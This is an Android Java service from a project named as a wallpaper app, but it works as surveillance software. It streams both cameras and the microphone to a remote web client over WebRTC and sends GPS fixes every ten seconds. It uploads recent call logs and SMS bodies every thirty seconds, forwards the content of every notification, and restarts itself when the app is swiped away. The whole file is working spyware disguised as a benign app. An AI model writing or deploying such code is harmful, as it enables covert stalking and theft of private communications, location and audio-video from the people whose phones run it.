package com.example.wallpaperapplication;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.RtpTransceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

public class StreamingService extends Service {
    private static final String TAG = "StreamingService";
    private static final String CHANNEL_ID = "streaming_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SIGNALING_URL = "http://<Your Server IP address>:3000";
    private static final long DATA_POLL_INTERVAL = 30_000; // 30s

    private PeerConnectionFactory factory;
    private EglBase eglBase;
    private SurfaceTextureHelper frontHelper;
    private SurfaceTextureHelper backHelper;
    private VideoCapturer frontCapturer;
    private VideoCapturer backCapturer;
    private VideoSource frontSource;
    private VideoSource backSource;
    private AudioSource audioSource;
    private PeerConnection peerConnection;
    private Socket socket;
    private String webClientId = null;
    private Handler dataHandler;
    private Runnable dataRunnable;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");

        // Foreground within 5s on O+; on Android 13+ you must have POST_NOTIFICATIONS granted
        startForeground(NOTIFICATION_ID, createNotification());

        if (!hasEssentialPermissions()) {
            Log.e(TAG, "Missing essential permissions (camera/mic/notifications). Stopping.");
            stopSelf();
            return;
        }

        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();

        startDataPollingIfAllowed();   // guarded by SMS/CALL permissions
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("STOP_STREAMING".equals(action)) {
                stopSelf();
            }
        }
        // Ask system to recreate after kill (keeps running when app is swiped away/locked)
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service onDestroy");
        cleanup();
        if (socket != null) socket.disconnect();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * ONLY the permissions that are absolutely required for streaming:
     * - CAMERA
     * - RECORD_AUDIO
     * - (Android 13+) POST_NOTIFICATIONS (so the foreground notif can show)
     *
     * Call Log / SMS / Location are OPTIONAL and checked where used.
     */
    private boolean hasEssentialPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
        boolean audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                        == PackageManager.PERMISSION_GRANTED;

        if (!camera) Log.e(TAG, "Camera permission missing");
        if (!audio) Log.e(TAG, "Record audio permission missing");
        if (!notify) Log.e(TAG, "Notifications permission missing (Android 13+)");
        return camera && audio && notify;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved: scheduling self-restart if permitted");

        // If the essentials aren’t granted, don’t try to resurrect.
        if (!hasEssentialPermissions()) {
            super.onTaskRemoved(rootIntent);
            return;
        }

        // Relaunch the FGS promptly.
        Intent restart = new Intent(getApplicationContext(), StreamingService.class);
        restart.setPackage(getPackageName());
        try {
            androidx.core.content.ContextCompat.startForegroundService(getApplicationContext(), restart);
        } catch (IllegalStateException e) {
            Log.w(TAG, "FGS start not allowed in onTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        setupFrontCapture();
        setupBackCapture();
        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupFrontCapture() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        String frontDevice = null;
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isFrontFacing(name)) {
                frontDevice = name;
                break;
            }
        }
        if (frontDevice == null) {
            Log.e(TAG, "No front camera available");
            return;
        }
        frontCapturer = enumerator.createCapturer(frontDevice, null);
        frontHelper = SurfaceTextureHelper.create("FrontCaptureThread", eglBase.getEglBaseContext());
        frontSource = factory.createVideoSource(false);
        frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
        try {
            frontCapturer.startCapture(640, 480, 30);
            Log.d(TAG, "Front video capture started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start front video capture", e);
        }
    }

    private void setupBackCapture() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        String backDevice = null;
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isBackFacing(name)) {
                backDevice = name;
                break;
            }
        }
        if (backDevice == null) {
            Log.w(TAG, "No back camera available");
            return;
        }
        backCapturer = enumerator.createCapturer(backDevice, null);
        backHelper = SurfaceTextureHelper.create("BackCaptureThread", eglBase.getEglBaseContext());
        backSource = factory.createVideoSource(false);
        backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
        try {
            backCapturer.startCapture(640, 480, 30);
            Log.d(TAG, "Back video capture started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start back video capture", e);
        }
    }

    private void setupAudioCapture() {
        MediaConstraints audioConstraints = new MediaConstraints();
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
        audioSource = factory.createAudioSource(audioConstraints);
        Log.d(TAG, "Audio capture initialized");
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        // ⚠️ Replace with your own TURN; public demo TURNs are unreliable / rate-limited
        ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
                .setUsername("your@email.com")
                .setPassword("yourpassword")
                .createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
        config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override public void onSignalingChange(PeerConnection.SignalingState s) { Log.d(TAG, "Signaling: " + s); }
            @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) { Log.d(TAG, "ICE: " + s); }
            @Override public void onIceConnectionReceivingChange(boolean r) {}
            @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) { Log.d(TAG, "ICE gathering: " + s); }
            @Override public void onIceCandidate(IceCandidate c) {
                if (webClientId == null || socket == null) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid", c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate", c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("signal", signal);
                    socket.emit("signal", msg);
                    Log.d(TAG, "Sent ICE: " + c.sdpMid);
                } catch (JSONException e) {
                    Log.e(TAG, "ICE send failed", e);
                }
            }
            @Override public void onIceCandidatesRemoved(IceCandidate[] cs) {}
            @Override public void onAddStream(org.webrtc.MediaStream ms) {}
            @Override public void onRemoveStream(org.webrtc.MediaStream ms) {}
            @Override public void onDataChannel(org.webrtc.DataChannel dc) {}
            @Override public void onRenegotiationNeeded() {}
            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms) { Log.d(TAG, "Track added: " + r.id()); }
        });

        if (peerConnection == null) {
            Log.e(TAG, "Failed to create PeerConnection");
            return;
        }

        if (frontSource != null) {
            VideoTrack frontTrack = factory.createVideoTrack("front_camera", frontSource);
            peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Front video track added");
        }
        if (backSource != null) {
            VideoTrack backTrack = factory.createVideoTrack("back_camera", backSource);
            peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Back video track added");
        }
        if (audioSource != null) {
            AudioTrack at = factory.createAudioTrack("audio", audioSource);
            peerConnection.addTransceiver(at, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Audio track added");
        }
    }

    private void connectSignaling() {
        Log.d(TAG, "Connecting to signaling at " + SIGNALING_URL);
        IO.Options opts = new IO.Options();
        opts.transports = new String[]{"websocket"};
        opts.reconnection = true;
        opts.reconnectionAttempts = 5;
        opts.reconnectionDelay = 5000;

        try {
            socket = IO.socket(SIGNALING_URL, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Bad signaling URL", e);
            stopSelf();
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket.IO CONNECTED");
            socket.emit("identify", "android");
            createAndSendOffer(); // may or may not have webClientId yet
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Connect error: " + Arrays.toString(args));
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on("web-client-ready", args -> {
            if (args.length > 0 && args[0] instanceof String) {
                webClientId = (String) args[0];
                Log.d(TAG, "Web client ready: " + webClientId);
                createAndSendOffer();
                startLocationUpdatesIfAllowed();
            }
        }).on("signal", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleSignaling((JSONObject) args[0]);
            }
        }).on("web-client-disconnected", args -> {
            if (args.length > 0 && args[0] instanceof String) {
                Log.d(TAG, "Web client disconnected: " + args[0]);
                if (args[0].equals(webClientId)) {
                    webClientId = null;
                    stopLocationUpdates();
                }
            }
        });

        socket.connect();
    }

    /** Optional: only if FINE_LOCATION granted */
    private void startLocationUpdatesIfAllowed() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Log.i(TAG, "Location permission not granted; skipping location updates");
            return;
        }

        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(10_000);
        locationRequest.setFastestInterval(5_000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (android.location.Location location : locationResult.getLocations()) {
                    sendLocation(location.getLatitude(), location.getLongitude());
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            Log.d(TAG, "Started location updates");
        } catch (SecurityException e) {
            Log.e(TAG, "Failed to start location updates", e);
        }
    }

    private void sendLocation(double latitude, double longitude) {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send location, no web client or socket disconnected");
            return;
        }
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("from", socket.id());
            locationData.put("to", webClientId);
            locationData.put("latitude", latitude);
            locationData.put("longitude", longitude);
            socket.emit("location", locationData);
            Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
            Log.d(TAG, "Stopped location updates");
        }
    }

    /**
     * DO NOT start a NotificationListenerService with startService().
     * You must declare it in AndroidManifest with:
     *
     * <service
     *   android:name=".StreamingService$NotificationListener"
     *   android:label="Notification Listener"
     *   android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
     *   android:exported="true">
     *   <intent-filter>
     *     <action android:name="android.service.notification.NotificationListenerService"/>
     *   </intent-filter>
     * </service>
     *
     * Then the user must enable it in Settings > Notifications > Notification access.
     * Keeping disabled here since streaming doesn’t require it.
     */
    @SuppressWarnings("unused")
    private void startNotificationListener() {
        Log.i(TAG, "NotificationListener must be enabled by the user in system settings; not starting directly.");
    }

    /** Optional: only if READ_CALL_LOG + READ_SMS granted */
    private void startDataPollingIfAllowed() {
        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED;
        boolean canSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;

        if (!canCall || !canSms) {
            Log.i(TAG, "Call log or SMS permission not granted; skipping data polling");
            return;
        }

        dataHandler = new Handler(Looper.getMainLooper());
        dataRunnable = new Runnable() {
            @Override public void run() {
                sendCallLogs();
                sendSmsMessages();
                if (dataHandler != null) {
                    dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
                }
            }
        };
        dataHandler.post(dataRunnable);
    }

    private void sendCallLogs() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send call logs, no web client or socket disconnected");
            return;
        }
        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };
            Cursor cursor = resolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );
            if (cursor == null) {
                Log.e(TAG, "Failed to query call logs");
                return;
            }

            JSONArray callLogs = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 10) {
                JSONObject call = new JSONObject();
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                call.put("number", number != null ? number : "Unknown");
                call.put("type", getCallTypeString(type));
                call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                call.put("duration", duration);

                callLogs.put(call);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("call_logs", callLogs);

            socket.emit("call_log", msg);
            Log.d(TAG, "Sent call logs: " + callLogs);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending call logs", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs", e);
        }
    }

    private void sendSmsMessages() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send SMS messages, no web client or socket disconnected");
            return;
        }

        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
            };
            Cursor cursor = resolver.query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC"
            );

            if (cursor == null) {
                Log.e(TAG, "Failed to query SMS messages");
                return;
            }

            JSONArray smsMessages = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 50) {
                JSONObject sms = new JSONObject();
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                sms.put("address", address != null ? address : "Unknown");
                sms.put("body", body != null ? body : "");
                sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                sms.put("type", getSmsTypeString(type));

                smsMessages.put(sms);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("sms_messages", smsMessages);

            socket.emit("sms", msg);
            Log.d(TAG, "Sent SMS messages: " + smsMessages);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending SMS messages", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying SMS messages", e);
        }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:   return "Missed";
            default:                          return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
            default:                                return "Unknown";
        }
    }

    private void createAndSendOffer() {
        if (peerConnection == null) {
            Log.e(TAG, "PeerConnection not ready");
            return;
        }
        if (webClientId == null) {
            Log.w(TAG, "No web client available yet; will send when ready");
            return;
        }

        Log.d(TAG, "Creating offer for web client: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created");
                String modifiedSdp = sdp.description.replace("a=sendrecv", "a=sendonly")
                        .replace("a=recvonly", "a=sendonly");
                SessionDescription modifiedSession = new SessionDescription(sdp.type, modifiedSdp);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", modifiedSession.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", webClientId);
                            msg.put("from", socket.id());
                            msg.put("signal", signal);
                            socket.emit("signal", msg);
                            Log.d(TAG, "Sent offer to web client");
                        } catch (JSONException e) {
                            Log.e(TAG, "Offer send fail", e);
                        }
                    }
                    @Override public void onSetFailure(String err) { Log.e(TAG, "Set local desc fail: " + err); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f) { Log.e(TAG, "Create offer fail(inner): " + f); }
                }, modifiedSession);
            }
            @Override public void onSetSuccess() {}
            @Override public void onCreateFailure(String err) { Log.e(TAG, "Create offer fail: " + err); }
            @Override public void onSetFailure(String err) { Log.e(TAG, "Set desc fail: " + err); }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
                Log.d(TAG, "Processed answer from web client");
            } else if (signal.has("candidate")) {
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                peerConnection.addIceCandidate(c);
                Log.d(TAG, "Added ICE candidate");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess() { Log.d(TAG, "SDP set success"); }
        @Override public void onCreateFailure(String e) { Log.e(TAG, "SDP create fail: " + e); }
        @Override public void onSetFailure(String e) { Log.e(TAG, "SDP set fail: " + e); }
    };

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Camera & microphone streaming");
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class);
        stop.setAction("STOP_STREAMING");
        PendingIntent stopPI = PendingIntent.getService(
                this, 0, stop,
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                        : PendingIntent.FLAG_UPDATE_CURRENT);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Camera and microphone streaming is running")
                .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true)
                .build();
    }

    private void cleanup() {
        stopLocationUpdates();
        if (frontCapturer != null) {
            try { frontCapturer.stopCapture(); } catch (InterruptedException ignored) {}
            frontCapturer.dispose();
            frontCapturer = null;
        }
        if (backCapturer != null) {
            try { backCapturer.stopCapture(); } catch (InterruptedException ignored) {}
            backCapturer = null;
        }
        if (frontSource != null) { frontSource.dispose(); frontSource = null; }
        if (backSource != null)  { backSource.dispose();  backSource = null; }
        if (audioSource != null) { audioSource.dispose(); audioSource = null; }
        if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
        if (frontHelper != null) { frontHelper.dispose(); frontHelper = null; }
        if (backHelper != null)  { backHelper.dispose();  backHelper = null; }
        if (eglBase != null) { eglBase.release(); eglBase = null; }
        if (factory != null) { factory.dispose(); factory = null; }
        if (dataHandler != null && dataRunnable != null) {
            dataHandler.removeCallbacks(dataRunnable);
            dataHandler = null;
            dataRunnable = null;
        }
        // Do NOT stop NotificationListener explicitly here; the system manages its lifecycle.
    }

    /** Optional NotificationListener: declare in manifest + user must enable in Settings. */
    public static class NotificationListener extends NotificationListenerService {
        private Socket socket;
        private String webClientId;

        @Override public void onCreate() {
            super.onCreate();
            Log.d(TAG, "NotificationListener onCreate");
            connectSignaling();
        }

        private void connectSignaling() {
            try {
                IO.Options opts = new IO.Options();
                opts.transports = new String[]{"websocket"};
                socket = IO.socket(SIGNALING_URL, opts);
                socket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "NotificationListener Socket.IO CONNECTED");
                    socket.emit("identify", "android");
                }).on("web-client-ready", args -> {
                    if (args.length > 0 && args[0] instanceof String) {
                        webClientId = (String) args[0];
                        Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
                    }
                }).on(Socket.EVENT_CONNECT_ERROR, args -> {
                    Log.e(TAG, "NotificationListener Connect error: " + Arrays.toString(args));
                });
                socket.connect();
            } catch (URISyntaxException e) {
                Log.e(TAG, "NotificationListener Bad signaling URL", e);
            }
        }

        @Override public void onNotificationPosted(StatusBarNotification sbn) {
            if (webClientId == null || socket == null || !socket.connected()) {
                Log.w(TAG, "Cannot send notification, no web client or socket disconnected");
                return;
            }
            try {
                Notification notification = sbn.getNotification();
                String appName = sbn.getPackageName();
                String title = notification.extras.getString(Notification.EXTRA_TITLE, "No Title");
                String text  = notification.extras.getString(Notification.EXTRA_TEXT, "No Text");
                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime()));

                JSONObject notificationData = new JSONObject();
                notificationData.put("appName", appName);
                notificationData.put("title", title);
                notificationData.put("text", text);
                notificationData.put("timestamp", timestamp);

                JSONObject msg = new JSONObject();
                msg.put("to", webClientId);
                msg.put("from", socket.id());
                msg.put("notification", notificationData);

                socket.emit("notification", msg);
                Log.d(TAG, "Sent notification: " + notificationData);
            } catch (JSONException e) {
                Log.e(TAG, "Error sending notification", e);
            }
        }

        @Override public void onDestroy() {
            super.onDestroy();
            if (socket != null) { socket.disconnect(); socket = null; }
            Log.d(TAG, "NotificationListener onDestroy");
        }
    }
}
